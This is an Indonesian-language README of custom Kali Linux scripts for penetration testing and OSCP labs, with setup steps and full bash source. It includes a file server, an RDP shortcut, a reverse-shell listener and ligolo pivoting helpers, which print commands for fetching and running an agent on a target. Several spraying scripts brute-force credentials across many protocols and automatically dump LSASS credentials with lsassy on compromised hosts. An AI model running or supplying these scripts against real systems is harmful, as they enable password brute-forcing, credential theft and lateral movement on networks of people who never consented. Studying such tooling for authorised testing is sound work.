# ⚙️ Custom Commands (Kali Linux)

Kumpulan shortcut untuk mempercepat workflow pentest / OSCP.

---

## 1. webserver

**Deskripsi:** HTTP server + auto generate wget & PowerShell (IWR)

### Setup
```bash
sudo nano /usr/local/bin/webserver
sudo chmod +x /usr/local/bin/webserver
```

### Script
```bash
#!/bin/bash

PORT=${1:-8000}

echo "[+] Starting web server on port $PORT..."
echo

FILES=$(ls -p | grep -v /)

echo "[+] Available download commands:"
echo

ip -4 -o addr show | awk '!/ lo / {
    split($4,a,"/");
    print $2 " (" a[1] "):"
}' | while read line; do

    IFACE=$(echo $line | awk '{print $1}')
    IP=$(echo $line | awk -F'[()]' '{print $2}')

    echo "$IFACE:"
    
    for f in $FILES; do
        echo "  wget http://$IP:$PORT/$f"
        echo "  iwr -uri http://$IP:$PORT/$f -Outfile $f"
    done

    echo
done

echo "[+] Serving files from: $(pwd)"
echo "----------------------------------------"

python3 -m http.server "$PORT" --bind 0.0.0.0
```

### Usage
```bash
webserver 80
```

---

## 2. rdp

**Deskripsi:** Shortcut cepat untuk koneksi RDP (xfreerdp)

### Setup
```bash
sudo nano /usr/local/bin/rdp
sudo chmod +x /usr/local/bin/rdp
```

### Script
```bash
#!/bin/bash

IP=$1
USER=${2:-Administrator}
PASS=$3

if [ -z "$IP" ]; then
    echo "Usage: rdp <ip> [user] [pass]"
    exit 1
fi

if [ -z "$PASS" ]; then
    read -s -p "Password: " PASS
    echo
fi

xfreerdp /v:$IP /u:$USER /p:"$PASS" /dynamic-resolution /cert:ignore +clipboard /timeout:5000 || echo "[!] Connection failed"
```

### Usage
```bash
rdp 192.168.50.250
rdp 192.168.50.250 offsec lab
```

### Info
- Default user: `Administrator`
- Password hidden saat input
- Clipboard aktif
- Cert: ignore (lab friendly)

---

## 3. spray

**Deskripsi:** Shortcut cepat untuk spray user password ke list target (net exec / nxc)

### Setup
```bash
sudo nano /usr/local/bin/spray
sudo chmod +x /usr/local/bin/spray
```

### Script
```bash
#!/bin/bash

# ===============================
# spray v5 - Domain + Local Auth Support
# ===============================

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}
AUTH_MODE=${4:-domain}   # domain | local

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_spray.txt"
CLEAN_OUT="$OUTDIR/clean_spray.txt"
SMB_OUT="$OUTDIR/smb_spray.txt"

THREADS=1
PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "nfs" "ldap")

# ===============================
# HELP
# ===============================
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "spray v5 - Domain & Local auth supported"
    echo
    echo "Usage:"
    echo "  spray [target] [user] [pass] [mode]"
    echo
    echo "Mode:"
    echo "  domain (default)"
    echo "  local"
    exit 0
fi

# ===============================
# DEP CHECK
# ===============================
command -v nxc >/dev/null || { echo "[!] nxc not found"; exit 1; }

# ===============================
# FILE CHECK
# ===============================
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [ -f "$f" ] || { echo "[!] Missing file: $f"; exit 1; }
done

# ===============================
# AUTH MODE
# ===============================
if [[ "$AUTH_MODE" == "local" ]]; then
    AUTH_FLAG="--local-auth"
else
    AUTH_FLAG=""
fi

# ===============================
# INIT OUTPUT
# ===============================
mkdir -p "$OUTDIR"
> "$RAW_OUT"
> "$CLEAN_OUT"
> "$SMB_OUT"

TARGETS=$(tr '\n' ' ' < "$TARGET_FILE")

echo "[+] Mode    : $AUTH_MODE"
echo "[+] Targets : $TARGET_FILE"
echo "[+] Users   : $USER_FILE"
echo "[+] Password: $PASS_FILE"
echo

# ===============================
# SPRAY LOOP
# ===============================
for proto in "${PROTOCOLS[@]}"; do
    echo "========================================"
    echo "[+] Trying protocol: $proto"
    echo "========================================"

    TMP_OUT=$(mktemp)

    nxc $proto $TARGETS \
        -u "$USER_FILE" \
        -p "$PASS_FILE" \
        $AUTH_FLAG \
        --threads $THREADS \
        --continue-on-success \
        --no-progress 2>/dev/null | tee "$TMP_OUT"

    cat "$TMP_OUT" >> "$RAW_OUT"
    grep -i "\[+\]" "$TMP_OUT" >> "$CLEAN_OUT"

    # Lockout protection
    if grep -q "STATUS_ACCOUNT_LOCKED_OUT" "$TMP_OUT"; then
        echo "[!] Lockout detected! Stopping..."
        rm -f "$TMP_OUT"
        exit 1
    fi

    # ===============================
    # SMB ENUM
    # ===============================
    if [[ "$proto" == "smb" ]]; then
        echo "[+] Checking valid SMB creds..."

        grep -i "\[+\]" "$TMP_OUT" | while read -r line; do

        IP=$(echo "$line" | awk '{print $2}')
        CREDS=$(echo "$line" | grep -oP '(?<=\[\+\] ).*')

        USER_PART=$(echo "$CREDS" | awk -F':' '{print $1}')
        PASS=$(echo "$CREDS" | awk -F':' '{print $2}')

        if [[ "$USER_PART" == *\\* ]]; then
            DOMAIN=$(echo "$USER_PART" | awk -F'\\' '{print $1}')
            USER=$(echo "$USER_PART" | awk -F'\\' '{print $2}')
        else
            DOMAIN=""
            USER="$USER_PART"
        fi

        if [[ -z "$USER" || -z "$PASS" ]]; then
            echo "[!] Parse failed: $line"
            continue
        fi

        echo "[+] SMB ENUM: $IP | $USER:$PASS"

        if [[ "$AUTH_MODE" == "local" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth --shares --threads 1 --no-progress 2>/dev/null)
        elif [[ -n "$DOMAIN" ]]; then
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" --shares --threads 1 --no-progress 2>/dev/null)
        else
            OUT=$(nxc smb "$IP" -u "$USER" -p "$PASS" --shares --threads 1 --no-progress 2>/dev/null)
        fi
        
        echo "$OUT" | tee -a "$SMB_OUT"
        
        # cek apakah login sukses
        if echo "$OUT" | grep -q "Pwn3d!"; then
            echo "[+] SMB compromised, running lsassy..." | tee -a "$SMB_OUT"
        
            if [[ "$AUTH_MODE" == "local" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" --local-auth -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            elif [[ -n "$DOMAIN" ]]; then
                nxc smb "$IP" -u "$USER" -p "$PASS" -d "$DOMAIN" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            else
                nxc smb "$IP" -u "$USER" -p "$PASS" -M lsassy --no-progress 2>/dev/null | tee -a "$SMB_OUT"
            fi
        fi

        done
    fi

    rm -f "$TMP_OUT"
    echo
done

echo "[+] Done!"
echo "[+] Raw   : $RAW_OUT"
echo "[+] Clean : $CLEAN_OUT"
echo "[+] SMB   : $SMB_OUT"
```

### Usage
```bash
spray
spray listip user.txt pass.txt
```

### Info
- Default if running without parameter spray = spray target user pass

---

## 4. webdav

**Deskripsi:** Shortcut cepat untuk running webdav (wsgidav)

### Setup
```bash
sudo nano /usr/local/bin/webdav
sudo chmod +x /usr/local/bin/webdav
```

### Script
```bash
#!/bin/bash

# Default values
DIR="/tmp/wsgidav"
PORT="80"

# Help menu
if [[ "$1" == "-h" || "$1" == "--help" ]]; then
    echo "Usage: webdav [directory] [port]"
    echo ""
    echo "Examples:"
    echo "  webdav                     # default /tmp/wsgidav port 80"
    echo "  webdav /tmp/share          # custom directory"
    echo "  webdav /tmp/share 8080     # custom directory + port"
    exit 0
fi

# Arguments
[[ -n "$1" ]] && DIR="$1"
[[ -n "$2" ]] && PORT="$2"

# Create directory if not exists
if [[ ! -d "$DIR" ]]; then
    echo "[+] Creating directory: $DIR"
    mkdir -p "$DIR"
fi

# Get IP
IP=$(hostname -I | awk '{print $1}')

# Banner
echo "[+] WebDAV Server Starting"
echo "[+] Root : $DIR"
echo "[+] Port : $PORT"
echo "[+] URL  : http://$IP:$PORT/"
echo ""

# Run WebDAV
wsgidav --host=0.0.0.0 --port="$PORT" --root="$DIR" --auth=anonymous


```

### Usage
```bash
webdav (Default /tmp/webdav port 80)
webdav /home/kali/share 8080 (Custom folder + port)
```

---


## 5. Reverse shell

**Deskripsi:** Shortcut cepat untuk running nc -lnvp + session log + rlwrap

### Setup
```bash
sudo nano /usr/local/bin/revshell
sudo chmod +x /usr/local/bin/revshell
```

### Script
```bash
#!/bin/bash

PORT=${1:-4444}
LOG="session_${PORT}_$(date +%F_%H-%M-%S).log"

echo "[+] Reverse shell listener"
echo "[+] Port : $PORT"
echo "[+] Log  : $LOG"
echo ""

script -f "$LOG" -c "rlwrap nc -lnvp $PORT"
```

### Usage
```bash
rev (default port 4444)
rev 1234
rev 8000
rev 9001
```

---

## 6. Ligolo-auto

**Deskripsi:** Shortcut cepat untuk running ligolo + create tun interface untuk pivoting + running webserver di folder yang telah ditentukan.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-auto
sudo chmod +x /usr/local/bin/ligolo-auto
```

### Script
```bash
#!/bin/bash

LIGOLO_DIR="/opt/postexploitation/ligolo"
PORT=11601
WEBPORT=8000
IFACE="ligolo"

# =========================
# DETECT IP
# =========================
IP=$(ip -4 addr show tun0 2>/dev/null | grep -oP '(?<=inet\s)\d+(\.\d+){3}')
[ -z "$IP" ] && IP=$(hostname -I | awk '{print $1}')

echo "[+] Attacker IP : $IP"
echo ""

# =========================
# SETUP TUN (AUTO)
# =========================
echo "[+] Preparing TUN interface..."

if ip link show $IFACE >/dev/null 2>&1; then
    echo "[*] TUN already exists, reusing..."
else
    sudo ip tuntap add user $(whoami) mode tun $IFACE
    sudo ip link set $IFACE up
    echo "[+] TUN created: $IFACE"
fi

echo ""

# =========================
# START WEBSERVER
# =========================
if [ -f "$LIGOLO_DIR/agent.exe" ]; then
    echo "[+] Starting webserver on :$WEBPORT"
    (cd "$LIGOLO_DIR" && python3 -m http.server $WEBPORT >/dev/null 2>&1 &)
else
    echo "[!] agent.exe not found!"
fi

# =========================
# TARGET COMMAND
# =========================
CMD1="iwr http://$IP:$WEBPORT/agent.exe -OutFile agent.exe"
CMD2="Start-Process .\\agent.exe -ArgumentList '-connect $IP:$PORT -ignore-cert'"

echo "[+] Run on target:"
echo "--------------------------------"
echo "$CMD1"
echo "$CMD2"
echo "--------------------------------"

# =========================
# START PROXY
# =========================
echo ""
echo "[*] Starting Ligolo..."
cd "$LIGOLO_DIR" || exit
./proxy -selfcert
                 
```

### Usage
```bash
ligolo-auto
```

## 7. Ligolo-route

**Deskripsi:** Shortcut cepat untuk nambah routing untuk pivoting menggunakan ligolo.

### Setup
```bash
sudo nano /usr/local/bin/ligolo-route
sudo chmod +x /usr/local/bin/ligolo-route
```

### Script
```bash
#!/bin/bash

IFACE="ligolo"

if [ -z "$1" ]; then
    echo "Usage: ligolo-route <subnet>"
    exit 1
fi

echo "[+] Adding route $1 via $IFACE"
sudo ip route add $1 dev $IFACE
                 
```

### Usage
```bash
ligolo-route 172.16.6.0/24
```

## 8. spray_noauth

**Deskripsi:** Shortcut cepat untuk spray enumerasi awal (net exec / nxc) tanpa user dan password (coba scan port semua protokol yang disupport nxc: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs)

### Setup
```bash
sudo nano /usr/local/bin/spray_noauth
sudo chmod +x /usr/local/bin/spray_noauth
```

### Script
```bash
#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
NC='\033[0m'

TARGET_FILE=${1:-target}
DOMAIN_NAME=${2:-.} 
OUTDIR="spray_netexec"
SCAN_FILE="$OUTDIR/nmap_scan.gnmap"
RAW_OUT="$OUTDIR/raw_spray_noauth.txt"
FINAL_OUT="$OUTDIR/final_noauth_summary.txt"

if [[ ! -f "$TARGET_FILE" ]]; then
    echo -e "${YELLOW}[!] Error: File '$TARGET_FILE' tidak ditemukan.${NC}"
    exit 1
fi

mkdir -p "$OUTDIR"
echo "" > "$RAW_OUT"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 1: MASSIVE EFFICIENT PORT SCANNING${NC}"
echo -e "${PURPLE}====================================================${NC}"

ALL_PORTS="21,22,135,389,445,1433,2049,3389,5900,5985"
echo -e "${CYAN}[*] Scanning $ALL_PORTS on all targets...${NC}"

nmap -Pn -n -iL "$TARGET_FILE" -p "$ALL_PORTS" --version-intensity 0 -sV --host-timeout 30s --open -oG "$SCAN_FILE" > /dev/null

echo -e "${GREEN}[+] Scan selesai. Memetakan target aktif per protokol...${NC}"

get_ips_by_port() { grep " $1/open/" "$SCAN_FILE" | awk '{print $2}' | sort -u; }

# Mapping & Summary
echo -e "${BLUE}----------------------------------------------------${NC}"
for p in 445 3389 135 5985 1433 22 21 5900 2049 389; do
    case $p in 445) proto="smb";; 3389) proto="rdp";; 135) proto="wmi";; 5985) proto="winrm";; 1433) proto="mssql";; 22) proto="ssh";; 21) proto="ftp";; 5900) proto="vnc";; 2049) proto="nfs";; 389) proto="ldap";; esac
    get_ips_by_port "$p" > "$OUTDIR/active_$proto.txt"
    COUNT=$(wc -l < "$OUTDIR/active_$proto.txt")
    [[ $COUNT -gt 0 ]] && echo -e "${CYAN}[*] $proto:${NC} $COUNT hosts found"
done
echo -e "${BLUE}----------------------------------------------------${NC}"

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 2: DEEP ANONYMOUS/GUEST CHECK${NC}"
echo -e "${PURPLE}====================================================${NC}"

# SMB Testing
if [[ -s "$OUTDIR/active_smb.txt" ]]; then
    echo -e "${YELLOW}[*] SMB: Running Null Session check...${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u '' -p '' --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
    
    echo -e "${YELLOW}[*] SMB: Running Guest Local Auth check...${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u 'guest' -p '' --local-auth --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
    
    echo -e "${YELLOW}[*] SMB: Running Guest Domain Auth check (Domain: $DOMAIN_NAME)...${NC}"
    timeout 40s nxc smb "$OUTDIR/active_smb.txt" -u 'guest' -p '' -d "$DOMAIN_NAME" --shares --no-progress 2>&1 | tee -a "$RAW_OUT"
fi

# FTP Testing
if [[ -s "$OUTDIR/active_ftp.txt" ]]; then
    echo -e "${YELLOW}[*] FTP: Running Anonymous check...${NC}"
    nxc ftp "$OUTDIR/active_ftp.txt" -u 'anonymous' -p '' --no-progress 2>&1 | tee -a "$RAW_OUT"
fi

# LDAP Testing & Null Bind Enumeration via NXC
if [[ -s "$OUTDIR/active_ldap.txt" ]]; then
    echo -e "${YELLOW}[*] LDAP: Checking Null Bind & Enumerating via NXC...${NC}"
    
    while IFS= read -r ip; do
        echo -e "\n${CYAN}>>> Testing LDAP Null Bind: $ip${NC}"
        
        # 1. Cek Null Bind menggunakan NXC
        nxc ldap "$ip" -u '' -p '' --no-progress > .tmp_ldap 2>&1
        cat .tmp_ldap >> "$RAW_OUT"

        if grep -q "\[+\]" .tmp_ldap; then
            echo -e "${GREEN}[!] SUCCESS: Null Bind found on $ip!${NC}"
            
            # 2. Folder Output per IP
            LDAP_DUMP_DIR="$OUTDIR/ldap_nxc_$ip"
            mkdir -p "$LDAP_DUMP_DIR"

            echo -e "${PURPLE}[EXEC] Enumerating Users, Groups, Computers, and Policy...${NC}"
            
            # 3. Ambil data terpenting (Users, Groups, Computers, Pass-Pol)
            # Simpan output mentah untuk record
            nxc ldap "$ip" -u '' -p '' --users > "$LDAP_DUMP_DIR/users.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --groups > "$LDAP_DUMP_DIR/groups.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --computers > "$LDAP_DUMP_DIR/computers.txt" 2>&1
            nxc ldap "$ip" -u '' -p '' --pass-pol > "$LDAP_DUMP_DIR/password_policy.txt" 2>&1

            # 4. Ekstraksi User List (Murni Username) untuk Spraying
            # Kita ambil kolom username dari output NXC
            grep "LDAP" "$LDAP_DUMP_DIR/users.txt" | awk '{print $5}' | grep -vE "Username|^$" | sort -u > "$OUTDIR/users_only_$ip.txt"

            if [[ -s "$OUTDIR/users_only_$ip.txt" ]]; then
                COUNT=$(wc -l < "$OUTDIR/users_only_$ip.txt")
                echo -e "${GREEN}[+] Successfully enumerated $COUNT users!${NC}"
                echo -e "${BLUE}[i] Userlist for spraying: $OUTDIR/users_only_$ip.txt${NC}"
            fi
            
            # Info tambahan: Cek Password Policy (penting biar nggak lockout)
            LOCKOUT=$(grep -i "lockout" "$LDAP_DUMP_DIR/password_policy.txt" | head -n 1)
            echo -e "${YELLOW}[!] Policy: $LOCKOUT${NC}"
            
        else
            echo -e "${RED}[-] Null Bind failed on $ip.${NC}"
        fi
        
        rm -f .tmp_ldap
    done < "$OUTDIR/active_ldap.txt"
fi

# NFS Testing
if [[ -s "$OUTDIR/active_nfs.txt" ]]; then
    echo -e "${YELLOW}[*] NFS: Listing exports...${NC}"
    nxc nfs "$OUTDIR/active_nfs.txt" --no-progress 2>&1 | tee -a "$RAW_OUT"
fi

echo -e "\n${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] PHASE 3: CLEANING & DEDUPLICATION${NC}"
echo -e "${PURPLE}====================================================${NC}"

# Deduplikasi dan pembersihan
sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" | grep -E "\[\+\]|READ|WRITE|Export" | grep -v "STATUS_ACCESS_DENIED" | sort -u > "$FINAL_OUT"

if [[ -s "$FINAL_OUT" ]]; then
    echo -e "${GREEN}[!] TEMUAN VALID:${NC}"
    cat "$FINAL_OUT"
else
    echo -e "${YELLOW}[!] Tidak ditemukan akses anonymous/guest yang valid.${NC}"
fi

echo -e "\n${BLUE}[i] Log lengkap di: $RAW_OUT${NC}"
echo -e "${BLUE}[i] Ringkasan di: $FINAL_OUT${NC}"

```

### Usage
```bash
spray_noauth (default baca file "target" yang berisi list IP)
spray_noauth target1
```


## 9. spray_auth

**Deskripsi:** Shortcut cepat untuk spray bruteforce user dan password (coba semua protokol nxc: smb, ssh, ldap, ftp, wmi, winrm, rdp, vnc, mssql, nfs)

### Setup
```bash
sudo nano /usr/local/bin/spray_auth
sudo chmod +x /usr/local/bin/spray_auth
```

### Script
```bash
#!/bin/bash

# --- COLORS ---
BLUE='\033[0;34m'
CYAN='\033[0;36m'
GREEN='\033[0;32m'
PURPLE='\033[0;35m'
YELLOW='\033[1;33m'
RED='\033[0;31m'
NC='\033[0m'

TARGET_FILE=${1:-target}
USER_FILE=${2:-user}
PASS_FILE=${3:-pass}

OUTDIR="spray_netexec"
RAW_OUT="$OUTDIR/raw_auth_spray.txt"
CLEAN_OUT="$OUTDIR/final_auth_success.txt"
SPIDER_DIR="$OUTDIR/spider_plus"

echo -e "${PURPLE}====================================================${NC}"
echo -e "${GREEN}[+] SPRAY ENGINE v59 | DEBUG & EXPLICIT MODE${NC}"
echo -e "${PURPLE}====================================================${NC}"

# Validasi File
for f in "$TARGET_FILE" "$USER_FILE" "$PASS_FILE"; do
    [[ ! -f "$f" ]] && echo -e "${RED}[!] Error: File '$f' tidak ada!${NC}" && exit 1
done

mapfile -t MAPFILE_U < "$USER_FILE"
mapfile -t MAPFILE_P < "$PASS_FILE"

PROTOCOLS=("smb" "rdp" "wmi" "winrm" "mssql" "ssh" "ftp" "vnc" "ldap")

for proto in "${PROTOCOLS[@]}"; do
    FILE_PROTO="$OUTDIR/active_$proto.txt"
    [[ ! -s "$FILE_PROTO" ]] && continue

    echo -e "\n${BLUE}====================================================${NC}"
    echo -e "${BLUE}[+] PROTOCOL: ${proto^^}${NC}"
    echo -e "${BLUE}====================================================${NC}"
    
    for ip in $(cat "$FILE_PROTO"); do
        echo -e "\n${CYAN}>>> Target Host: $ip${NC}"
        
        # Discovery Domain (Debugging)
        echo -e "${GRAY}[DEBUG] Discovering domain for $ip...${NC}"
        DOMAIN=$(nxc smb "$ip" --no-progress 2>/dev/null | grep -oP '(?<=domain:)[^ )]+' | head -n 1)
        [[ -z "$DOMAIN" ]] && DOMAIN="."
        echo -e "${GRAY}[DEBUG] Domain detected: $DOMAIN${NC}"

        for user in "${MAPFILE_U[@]}"; do
            USER_COMPLETED=false

            for pass in "${MAPFILE_P[@]}"; do
                
                # --- 1. STRATEGY: LOCAL AUTH ---
                EXTRA=""
                [[ "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]] && EXTRA="--local-auth"
                
                # DEBUG COMMAND ECHO
                echo -e "\n${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' $EXTRA${NC}"
                
                # RUN & SHOW OUTPUT
                # Kita tidak pakai -ne \r lagi supaya output asli NXC tidak tertimpa
                timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" $EXTRA --no-progress > .tmp_res 2>&1
                cat .tmp_res # Mencetak output asli NXC ke layar
                cat .tmp_res >> "$RAW_OUT"
                
                if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
                    echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
                    grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
                    USER_COMPLETED=true
                    
                    if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
                        echo -e "${RED}[DEBUG] Pwn3d status confirmed. Triggering Post-Exploitation...${NC}"
                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M lsassy${NC}"
                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M lsassy | tee -a "$RAW_OUT"
                        
                        echo -e "${PURPLE}[EXEC] nxc smb $ip -u '$user' -p '$pass' $EXTRA -M spider_plus${NC}"
                        nxc smb "$ip" -u "$user" -p "$pass" $EXTRA -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
                    fi
                fi

                # --- 2. STRATEGY: DOMAIN AUTH ---
                if [[ "$USER_COMPLETED" == "false" && "$proto" =~ ^(smb|rdp|wmi|winrm|mssql)$ ]]; then
                    echo -e "${PURPLE}[EXEC] nxc $proto $ip -u '$user' -p '$pass' -d '$DOMAIN'${NC}"
                    
                    timeout 25s nxc "$proto" "$ip" -u "$user" -p "$pass" -d "$DOMAIN" --no-progress > .tmp_res 2>&1
                    cat .tmp_res
                    cat .tmp_res >> "$RAW_OUT"
                    
                    if grep -qE "\[\+\]|Pwn3d\!" .tmp_res; then
                        echo -e "${GREEN}[!] Success found! Logging to $CLEAN_OUT${NC}"
                        grep -E "\[\+\]|Pwn3d\!" .tmp_res | head -n 1 >> "$CLEAN_OUT"
                        USER_COMPLETED=true
                        
                        if [[ "$proto" == "smb" && $(grep "Pwn3d!" .tmp_res) ]]; then
                            echo -e "${RED}[DEBUG] Pwn3d status (Domain) confirmed. Triggering Post-Exploitation...${NC}"
                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M lsassy | tee -a "$RAW_OUT"
                            nxc smb "$ip" -u "$user" -p "$pass" -d "$DOMAIN" -M spider_plus -o DOWNLOAD_FLAG=FALSE EXCLUDE_FILTER="c\$,ipc\$,admin\$,netlogon,sysvol" OUTPUT_FOLDER="$(readlink -f $SPIDER_DIR)" > /dev/null 2>&1
                        fi
                    fi
                fi

                if [[ "$USER_COMPLETED" == "true" ]]; then
                    echo -e "${CYAN}[i] Skipping other passwords for user: $user${NC}"
                    break 
                fi
                
                rm -f .tmp_res
            done
        done
    done
done

# --- MULAI PROSES PEMBERSIHAN (DI LUAR LOOP) ---
FINAL_OUT="$OUTDIR/final_summary.txt" 
# 1. Bersihkan kode warna ANSI dari log mentah (RAW_OUT)
if [ -f "$RAW_OUT" ]; then
    sed -r "s/\x1B\[([0-9]{1,3}(;[0-9]{1,2})?)?[mGK]//g" "$RAW_OUT" > "$OUTDIR/temp_clean.log"

    # 2. Ambil baris penting & Hapus Duplikat TANPA MENGUBAH URUTAN
    # Kita pakai awk '!x[$0]++' untuk menjaga urutan asli (chronological)
    grep -aE "\[\*\]|\[\+\]|LSASSY" "$OUTDIR/temp_clean.log" | awk '!x[$0]++' > "$FINAL_OUT"

    echo -e "\n${PURPLE}====================================================${NC}"
    echo -e "${GREEN}[+] PHASE 4: FINAL CHRONOLOGICAL SUMMARY${NC}"
    echo -e "${PURPLE}====================================================${NC}"

    # 3. Cetak ke layar dengan Highlighting
    if [ -s "$FINAL_OUT" ]; then
        while IFS= read -r line; do
            if echo "$line" | grep -q "LSASSY"; then
                echo -e "${PURPLE}${line}${NC}"
            elif echo "$line" | grep -q "\[+\]"; then
                echo -e "${GREEN}${line}${NC}"
            elif echo "$line" | grep -q "\[\*\]"; then
                echo -e "${BLUE}${line}${NC}"
            else
                echo -e "${NC}${line}${NC}"
            fi
        done < "$FINAL_OUT"
    else
        echo -e "${YELLOW}[!] Tidak ada data ditemukan.${NC}"
    fi

    # Cleanup
    rm "$OUTDIR/temp_clean.log" 2>/dev/null
else
    echo -e "${RED}[!] File mentah $RAW_OUT tidak ditemukan!${NC}"
fi
echo -e "\n${GREEN}[+] ALL PROCESSES FINISHED.${NC}"
```

### Usage
```bash
spray_auth (default baca file "target" yang berisi list IP)
spray_auth target user pass
```
